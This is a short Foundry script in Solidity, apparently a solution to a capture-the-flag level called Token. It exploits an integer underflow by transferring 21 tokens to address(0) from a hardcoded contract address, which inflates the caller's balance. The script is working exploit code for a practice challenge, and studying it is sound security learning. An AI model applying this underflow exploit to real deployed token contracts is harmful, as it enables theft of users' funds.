// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "../src/Token.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract TokenSolution is Script {

    Token public tokenInstance = Token(0x6b190632382a57FaD271d91789af8c01Ac327A53);

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        tokenInstance.transfer(address(0), 21);
        console.log("My balance: ", tokenInstance.balanceOf(vm.envAddress("MY_ADDRESS")));

        vm.stopBroadcast();
    }
}